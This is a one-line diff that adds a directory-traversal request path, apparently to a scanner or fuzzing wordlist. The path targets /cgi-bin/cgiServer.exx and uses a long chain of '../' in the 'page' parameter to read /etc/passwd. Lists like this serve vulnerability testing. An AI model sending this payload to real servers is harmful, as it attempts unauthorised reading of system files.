@@ -1,0 +1,1 @@
+/cgi-bin/cgiServer.exx?page=../../../../../../../../../../../etc/passwd
